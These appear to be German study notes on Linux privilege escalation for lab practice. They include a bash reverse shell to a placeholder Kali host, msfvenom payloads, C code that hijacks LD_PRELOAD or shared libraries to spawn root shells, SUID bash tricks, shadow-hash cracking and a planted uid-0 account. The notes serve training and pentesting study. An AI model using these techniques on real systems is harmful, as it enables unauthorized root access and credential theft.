## Strategy

1. User prüfen (id, whoami)
2. Linux Smart Enumeration mit steigenden Leveln ausführen (primär 1 & 2)
3. LinEnum & weitere Tools ebenfalls ausprobieren
4. Sollten Scripts nicht funktionieren, können Befehle manuell genutzt werden
5. Weitere PrivEsc Cheat Sheets ansehen (https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
6. Verzeichnisse wie **/var/backup** und **/var/logs** könnten interessant sein.

## Tools

Linux Smart Enumeration

https://github.com/diego-treitos/linux-smart-enumeration

```bash
wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh
curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh;chmod 700 lse.sh

./lse.sh -i <-l 1/2>
```

LinEnum

https://github.com/rebootuser/LinEnum

Linuxprivchecker

https://github.com/linted/linuxprivchecker

BeRoot

https://github.com/AlessandroZ/BeRoot

Unix-Privesc-Check

https://pentestmonkey.net/tools/audit/unix-privesc-check

LinPEAS

## Compiling Info

Für 64 Bit Systeme, gcc mit Parameter -fPIC auf Zielsystem ausführen.

## General Info

Wenn möglich, Bash kopieren mit SUID Bit:

```bash
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
/tmp/rootbash -p
```

#### Fehlermeldungen

Beim ausführen von .sh Scripts **bad interpreter**, liegt daran, dass Script auf Windows "erstellt" wurde. Einfache Lösung:

```bash
sed -i -e "s/^M//" <filename>
```

## Kernel Exploits

Kernelversion herausfinden und auf Exploitdb/Github/Google nach Exploits suchen (andere Wege sind zu bevorzugen, da Kernel Exploits unstable sein können!):

```bash
#Kernelversion anzeigen
uname -a
#Nach Exploits suchen
#Searchsploit, etwas unsexy
searchsploit linux kernel <version, zB 2.6.32> priv esc
#linux-exploit-suggester-2 https://github.com/jondonas/linux-exploit-suggester-2
./linux-exploit-suggester-2.pl -k <version, z.B. 2.6> (-d für Download)
```

## Service Exploits

Services, die als root laufen und exploitable sind (exploitdb o.ä.) können zu Priv Esc führen.

```bash
#Alle Services anzeigen, welche als root ausgeführt werden
ps aux | grep "^root"
#Nun Version rausfinden
<program> --version
<program> -v
#Auf Debian Systemen mit dpkg
dpkg -l | grep <program>
#Auf Systemen mit rpm
rpm -qa | grep <program>
```

#### Port Forwarding

Evtl. läuft ein root Prozess auf einem internen Port. Wenn ein Exploit lokal auf dem Zielsystem nicht ausgeführt werden kann, kann der Port mittels SSH zum Kali System geforwarded werden. Beispiel MYSQL:

```bash
#Auf Zielsystem
#Port herausfinden/darstellen
netstat -nl
127.0.0.1:3306 steht hier für MYSQL...
#ssh -R <local-port>:127.0.0.1:<service-port> <username>@<local-machine>
ssh -R 4444:127.0.0.1:3306 root@192.168.119.225

#Auf Kali
mysql -u root -h 127.0.0.1 -P 4444
```

## Weak File Permissions

#### /etc/shadow

Wenn /etc/shadow **readable** ist, können Hashes ausgelesen werden und das root Passwort vllt. gecracked werden. Das Passwort befindet sich zwischen dem ersten und zweiten ":". $6$ zu Beginn gibt an, dass es sich um ein sha512 Hash handelt.

![image-20200725200203020](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200725200203020.png)

Der Hash kann in ein File gespeichert und mit john gecracked werden.

```bash
#Hash gespeichert in hash.txt
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Wenn /etc/shadow **writable** ist, kann das root Passwort überschrieben werden. Unbedingt Backup anlegen

```bash
#Auf Kali einen Passworthash erzeugen - newpassword kann frei gewählt werden
mkpasswd -m sha-512 newpassword
```

![image-20200725200759527](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200725200759527.png)

Auf Kali in /etc/shadow das Passwort einfügen (erste Zeile ist root User)

![](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200725200707381.png)

Anschließend wieder **su** mit neuem Passwort (s.O.).

#### /etc/passwd

In /etc/passwd ist normalerweise kein Passwort mehr gesetzt, da mittlerweile /etc/shadow genutzt wird. Sollte jedoch ein Passwort in /etc/passwd gesetzt sein, so wird dieses bevorzuugt. 

Normalerweise sieht der Eintrag für root wie folgt aus (wobei x angibt, dass das Passwort in /etc/shadow enthalten ist):

<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200725201410801.png" alt="image-20200725201410801" style="zoom: 50%;" />

In einigen Versionen von Linux kann das **x jedoch einfach entfernt werden**, wodurch root ein leeres Passwort besitzt.

Wenn /etc/passw writable ist, kann ein eigenes Passwort gesetzt werden:

```bash
#Passwort generieren
openssl passwd "newpassword"
#in /etc/passwd das x durch den neuen Hash ersetzen
#su mit neuem Passwort ausführen
```

Alternativ kann ein neuer root Benutzer mit folgendem Format hinzugefügt werden:

```bash
<username>:<passworthash>:0:0:root:/root:/bin/bash
```

![image-20200725202002427](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200725202002427.png)

Anschließend mit **su newroot** und gesetztem Passwort einloggen.

#### Backups

Wenn solche sensiblen Dateien gut gesicher sind, könnte ein Benutzer unsichere Backups angelegt haben.. Mögliche Orte könnten sein:

```bash
/
/tmp
/var/backups
```

Auch SSH Private Keys könnten irgendwo liegen:

```bash
#Im / Verzeichnis befindet sich das .ssh Verzeichnis, welches vllt. listbar ist.
#Hier befindet sich ein readable private key (z.B. von root)
#Mittels cat kann ermittelt werden, dass es sich um ein Private Key handelt
#-----BEGIN RSA PRIVATE KEY-----
Wenn es sich um einen root Key handelt sollte geprüft werden, ob ein SSH root Login überhaupt möglich ist:
grep PermitRootLogin /etc/ssh/sshd_config
PermitRootLogin yes
#Inhalt vom Key (inkl. Kopf- und Fußzeile) auf Kali in neues File schreiben, Berechtigungen geben und Login testen
chmod 600 root_key_file
ssh -i root_key_file root@Zielsystem-IP
```

## Sudo

Exakte Definition der Rechte sind in /etc/sudoers gespeichert.

```bash
#Wenn Benutzer sudo commands ohne Passwort auflisten kann
sudo -l
```

Sofern man das Passwort des Benutzers kennt, kann folgendes bereits für PrivEsc reichen:

```bash
sudo su
#Falls sudo su nicht erlaubt ist:
sudo -s
sudo -i
sudo /bin/bash
sudo passwd
```

#### Shell Escape Sequences

Sequences können gefunden werden auf https://gtfobins.github.io/

```bash
#z.B. falls sudo find möglich ist
sudo find . -exec /bin/sh \; -quit
```

#### Abusing intended functionality

Wenn keine Shell Escape Sequences existieren, könnten diverse Tools u.U. dennoch für PrivEsc genutzt werden. Ein Beispiel hierfür ist Apache 2:

```bash
#Der Befehl versucht, die angegebene Datei zu parsen, was in einem Fehler resultiert. Allerdings wird die erste Zeile ausgegeben, vllt. ist nun das Cracken des root Passworts möglich
sudo apache2 -f /etc/shadow
#Wenn Cracken erfolgreich ist, einfach mit su auf root Shell wechseln
```

![image-20200726122806287](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726122806287.png)

#### Environment Variables

Wenn **LD_PRELOAD** gesetzt ist, kann u.U. eine root Shell gespawned werden. Hierfür muss z.B. **LD_PRELOAD für env_keep gesetzt sein**.

![image-20200726123323688](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726123323688.png)

Nun kann ein shared object File erzeugt werden, welches später geladen wird. Folgendes C Programm wird hierfür genutzt.

```bash
#Programm preload.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}

#Kompilieren mit: gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
#-fPIC für x64
#Nun ein erlaubtes sudo Programm ausführen
sudo LD_PRELOAD=/tmp/preload.so find
```

<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726123814082.png" alt="image-20200726123814082" style="zoom: 80%;" />

------

**LD_LIBRARY_PATH** beinhaltet Verzeichnisse, in welchen als erstes nach shared libraries gesucht wird. Um die shared libraries, welche ein Programm nutzt, anzeigen zu lassen, kann folgender Befehl genutzt werden:

```bash
ldd /usr/sbin/apache2
```

Wenn nun eine shared library mit dem selben Namen wie die library, die das Programm lädt, erzeugt wird und **LD_LIBRARY_PATH** auf deren parent directory gesetzt wird, wird die eigene shared library als erstes geladen. Folgende Befehle (inkl. C Programm) werden hierfür genutzt, wenn **LD_LIBRARY_PATH** gesetzt ist:

```bash
#Programm library_path.c

#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}

#Kompilieren mit gcc -o libcrypt.so.1 -shared -fPIC library_path.c
sudo LD_LIBRARY_PATH=. apache2
```

<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726124542913.png" alt="image-20200726124542913" style="zoom: 67%;" />

## Cron Jobs

Cron Jobs laufen unter dem Security Level des Benutzer, welchem der Job gehört. Cron table Files (crontabs) beinhalten die Config für Con Jobs. Sie sind an den folgenden Orten gespeichert:

```bash
#Benutzer crontabs
/var/spool/cron/
/var/spool/cron/crontabs/

#System-wide crontabs
/etc/crontab
```

#### File Permissions

Wenn ein Cron Jobs Scripts ausführt, welche ein Script laden und dieses Script beschreibbar ist, kann eigener Code ausgeführt würden. Dies kann u.U. zu PrivEsc führen. Der Prozess kann z.B. so aussehen:

![image-20200726131253550](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726131253550.png)

**overwrite.sh** wird minütlich als root ausgeführt (durch * * * * * erkenntlich) und kann z.B. eine Reverse Shell zu Kali ausführen:

```bash
#Inhalt von overwrite.sh

#!/bin/bash
bash -i >& /dev/tcp/KALI-IP/PORT 0>&1
```

Auf Kali nun einen nc listener auf gewähltem Port starten und warten, bis Verbindung als root aufgebaut wird.

#### PATH Environment Variable

In crontab Files ist eine PATH env Variable gesetzt, welche per Default auf /usr/bin:/bin gesetzt ist (diese kann vllt. überschrieben werden). Wenn ein Cronjob/Script **keinen** absoluten Pfad nutzt und eines der PATH Verzeichnisse schreibbar durch den aktuellen Benutzer ist, könnte dort ein Script (mit dem selben Namen wie im crontab) erstellt werden, welches ausgeführt wird. 

![image-20200726133518644](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726133518644.png)

Nun kann z.B. eine rootbash erstellt werden:

```bash
#Inhalt von overwrite.sh

#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash

#Anschließend rootbash ausführbar machen (chmod +x overwrite.sh)
```

#### Wildcards

Befehle, welche Wildcards nutzen, können ausgetrickst werden, indem man Dateien erstellt und diese als commandline arguments benennt.

![image-20200726134346644](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726134346644.png)

Eine Suche auf https://gtfobins.github.io/ nach tar bietet eine Sequenz an, um eine Root Shell zu erzeugen:

![image-20200726134500682](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726134500682.png)

Ins Verzeichnis nun eine Reverse Shell legen (mit msfvenom erzeugt):

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI-IP LPORT=KALI-Port -f elf -o shell.elf
```

Diese wird ins /home/user Verzeichnis kopiert. Anschließend Dateien erzeugen, welche tar als Argumente nutzen wird:

![image-20200726134759086](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726134759086.png)

## SUID/SGID Files

SUID wird als File Owner, SGID als Group Owner ausgeführt. Wenn die Datei root gehört, könnte PrivEsc möglich sein. Mit folgendem Befehl werden Dateien angezeigt, welche entweder das SUID oder SGID Bit gesetzt haben:

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

#### Shell Escape Sequences

Wieder auf https://gtfobins.github.io/ nach Sequences suchen.

#### Known Exploits

Mit **lse** nach **Uncommon setuid binaries** suchen. Die Software könnte für Exploits anfällig sein. Die genaue Version kann oft mit dem Parameter -v/--version identifiziert werden. Anschließend searchsploit, google, Github, etc....

#### Shared Object Injection

Mit **strace** kann überprüft werden, welche Shared Objects ein Programm laden will. Wenn ein Shared Object fehlt und dieses Verzeichnis beschreibbar ist, kann dadurch evtl. eine root shell gestartet werden. Hierfür in **lse** nach Bianries mit setuid Bit schauen (oder Find command von oben). Um nun fehlende Shared Objects zu finden, kann folgender Befehl genutzt werden:

```bash
strace <program> 2>&1 | grep -iE "open|access|no such file"
```

Beispiel:

<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726145804467.png" alt="image-20200726145804467" style="zoom:80%;" />

Das File libcalc.so befindet sich im beschreibbaren User Directory und kann durch eine eigene .so Datei ersetzt werden. Hierfür muss der exakte Pfad genutzt werden. Das .so File wird wie folgt erzeugt:

```bash
#Programmname libcalc.c

#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject() {
	setuid(0);
	system("/bin/bash -p");
}

#Kompilieren: gcc -shared -fPIC -o libcalc.so libcalc.c
#Programm ausführen..
```

#### PATH Environment Variable

Wenn ein SUID Programm ein anderes Programm startet, könnte dies für PrivEsc ausgenutzt werden. Programmnamen werden in binaries oft als String gespeichert. Daher ist es z.B. möglich, mittels `strings` nach so einem Programm zu suchen. Weitere Methoden sind:

```bash
strace -v -f -e execve <command> 2>&1 | grep exec
ltrace <command>
```

<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726151056932.png" alt="image-20200726151056932" style="zoom:80%;" />

Der Befehl `service` wird ohne absoluten Pfad ausgeführt und sucht daher in der PATH Variable nach Pfaden. Die PATH Variable kann vom Benutzer manipuliert werden, indem ein selbst gewähltes Verzeichnis an den Anfang der Variable gehängt wird. Um das aktuelle Verzeichnis vorne anzuhängen, kann folgender Befehl genutzt werden:

```bash
PATH=.:$PATH
```

Nun muss das Binary `service` erstellt werden:

```bash
#Programm service.c

int main() {
	setuid(0);
	system("/bin/bash -p");
}

#Kompilieren mit gcc -o service service.c
```

Zuletzt das Programm starten mit **/usr/local/bin/suid-env** - alternativer Weg (gleicher Output):

<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726151546266.png" alt="image-20200726151546266" style="zoom:80%;" />

#### Abusing Shell Features (1)

Bash Versionen unter 4.2-048 erlaubt Bash Funktionen mit "/" im Namen, welche bevorzug ausgeführt werden. Wenn ein Programm (mit SUID) ein weiteres Programm aufruft - welches mit einem absoluten Pfad angegeben ist - kann mittels einer Funktion anderer "Code" ausgeführt werden. 

<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726185301811.png" alt="image-20200726185301811" style="zoom: 80%;" />

Mit folgenden Befehlen kann nun eine Funktion als root User ausgeführt werden:

```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

#### Abusing Shell Features (2)

Bash Versionen unter 4.4 inkludieren im Debugging Mode die Environment Variable PS4, welche bei der Darstellung Kommandos ausführen kann. Gleiches Szenario wie bei Abusing Shell Features (1). Um eine rootbash zu erzeugen, wird folgender Befehl genutzt (startet eine Debugging Bash):

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)'
/tmp/rootbash -p
```

## Passwords & Keys

Grundsätzlich nachdem ein Passwort gefunden wurde, sollte stets ein Login als root ausprobiert werden.

#### History Files

Im Hauptverzeichnis des Benutzers befinden sich einige History Files, welche unter Umständen Passwörter beinhalten könnten.

#### Config Files

Config Files unterschiedlicher Services könnten Passwörter oder Links zu Passwörtern beinhalten.

#### SSH Keys

Mit einem Private Key ist vermutlich stets ein SSH Login möglich, daher sicher speichern.

## NFS (Network File System)

Nützliche Befehle:

```
#Shares anzeigen mit bash oder nmap
showmount -e <target-ip>
nmap -sV --script=nfs-showmount <target-ip>

#NFS Share mounten
mount -o rw,vers=2 <target-ip>:<share> <local-directory>
```

Wenn Dateien auf einem Share angelegt werden, haben diese als Owner/Group den tatsächlichen Ersteller eingetragen, auch wenn dieser auf dem System nicht existiert. Dateien, welche als root angelegt werden, bekommen durch die (Default-) Konfiguration **root squashing** allerdings den Owner **nobody**. Wenn jedoch die Option **no_root_squash** verwendet wird, kann dies u.U. für PrivEsc ausgenutzt werden. 

<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726192045861.png" alt="image-20200726192045861" style="zoom:80%;" />

Hierfür wird von Kali aus eine Bash als root mit msfvenom erzeugt und auf den Share mit den entsprechenden Bits kopiert:

```bash
#Szenario: Sharename ist /tmp auf Zielsystem

mkdir /tmp/nfs
mount -o rw,vers=2 <target-ip>:/tmp /tmp/nfs
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +xs /tmp/nfs/shell.elf

#Auf Zielsystem anschließend die Shell ausführen
/tmp/shell.elf
```

![image-20200726192507554](C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726192507554.png)

<img src="C:\Users\dani\AppData\Roaming\Typora\typora-user-images\image-20200726192549433.png" alt="image-20200726192549433" style="zoom: 80%;" />